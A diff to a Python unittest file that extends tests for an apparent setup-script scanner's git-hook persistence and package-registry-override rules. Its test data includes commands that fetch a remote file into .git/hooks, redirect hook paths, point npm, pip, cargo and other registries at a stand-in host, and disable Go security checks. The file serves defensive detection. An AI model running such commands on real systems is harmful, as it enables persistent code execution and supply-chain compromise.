@@ -318,6 +318,13 @@ class Negation(unittest.TestCase):
             "git config core.hooksPath .githooks\n",
             "git config --global init.templateDir ~/.git-template\n",
             "git -c core.hooksPath=/tmp/h commit -m x\n",
+            "git -C repo config core.hooksPath .githooks\n",
+            "git --git-dir=repo/.git config --file repo/.git/config core.hooksPath h\n",
+            "git -c init.templateDir=/tmp/t clone https://x.example/r\n",
+            "rsync -a hooks/ .git/hooks/pre-rebase\n",
+            "sed -i 's/x/y/' .git/hooks/pre-commit\n",
+            "wget --output-document=.git/hooks/post-commit https://x.example/h\n",
+            "fs.createWriteStream('.husky/_/pre-push')\n",
         ):
             with self.subTest(script=script):
                 report = report_for(script, name="setup.sh")
@@ -333,9 +340,42 @@ class Negation(unittest.TestCase):
             "ls .git/hooks\n",
             "git config --get core.hooksPath\n",
             "curl -o out.txt https://github.com/pre-commit/pre-commit-hooks\n",
+            "git config --unset core.hooksPath\n",
+            "git -C repo config --get init.templateDir\n",
         ):
             with self.subTest(script=script):
                 self.assertNotIn("PERSIST-GIT-HOOK", rule_ids(report_for(script, name="setup.sh")))
+
+    def test_every_git_hook_name_is_recognised_as_a_write_target(self):
+        """The hook-name list is repeated inside the pattern, once per write form. Pin all of them."""
+        hooks = [
+            "applypatch-msg",
+            "pre-applypatch",
+            "post-applypatch",
+            "pre-commit",
+            "pre-merge-commit",
+            "prepare-commit-msg",
+            "commit-msg",
+            "post-commit",
+            "pre-rebase",
+            "post-checkout",
+            "post-merge",
+            "pre-push",
+            "post-rewrite",
+            "pre-auto-gc",
+            "push-to-checkout",
+            "reference-transaction",
+            "fsmonitor-watchman",
+        ]
+        for hook in hooks:
+            for script in (
+                f"cat > hooks/{hook}\n",
+                f"open('hooks/{hook}', 'w')\n",
+                f"fs.writeFileSync('hooks/{hook}', x)\n",
+                f'Path("hooks/{hook}").write_text(x)\n',
+            ):
+                with self.subTest(script=script):
+                    self.assertIn("PERSIST-GIT-HOOK", rule_ids(report_for(script, name="setup.sh")))
 
     def test_overriding_the_package_registry_is_flagged(self):
         for script in (
@@ -365,6 +405,23 @@ class Negation(unittest.TestCase):
             "poetry source add corp https://x.example/simple\n",
             "conda config --add channels https://x.example/conda\n",
             "gem sources --add https://x.example/\n",
+            "echo 'registry = \"https://x.example\"' >> bunfig.toml\n",
+            "cp corp.condarc ~/.condarc\n",
+            "cat > .bundle/config << EOF\n",
+            "bundle config set --global mirror.https://rubygems.org https://x.example\n",
+            "poetry config repositories.corp https://x.example/simple\n",
+            "uv sync --default-index https://x.example/simple\n",
+            "npm i --registry=$REG left-pad\n",
+            'npm install --registry "$URL" left-pad\n',
+            "pip install --index-url=$MIRROR corp-utils\n",
+            "npm config -g set registry https://x.example\n",
+            "npm config --location=user set registry https://x.example\n",
+            "export POETRY_REPOSITORIES_CORP_URL=https://x.example/simple\n",
+            "export CARGO_REGISTRIES_CORP_INDEX=sparse+https://x.example/\n",
+            "export BUNDLE_MIRROR__RUBYGEMS__ORG=https://x.example\n",
+            "export GOFLAGS=-insecure\n",
+            "$env:PIP_INDEX_URL = 'https://x.example/simple'\n",
+            "set PIP_INDEX_URL=https://x.example/simple\n",
         ):
             with self.subTest(script=script):
                 report = report_for(script, name="setup.sh")
@@ -381,6 +438,11 @@ class Negation(unittest.TestCase):
             "pip config list\n",
             "go env GOPROXY\n",
             "result = rewrite(.npmrc)\n",
+            "go env GOPROXY GOSUMDB\n",
+            "echo $GOPROXY done\n",
+            "GOPROXY is the module proxy Go downloads through.\n",
+            "mygoproxy x\n",
+            "npm install --registry-scope foo\n",
         ):
             with self.subTest(script=script):
                 self.assertNotIn("SUPPLY-REGISTRY-OVERRIDE", rule_ids(report_for(script, name="setup.sh")))
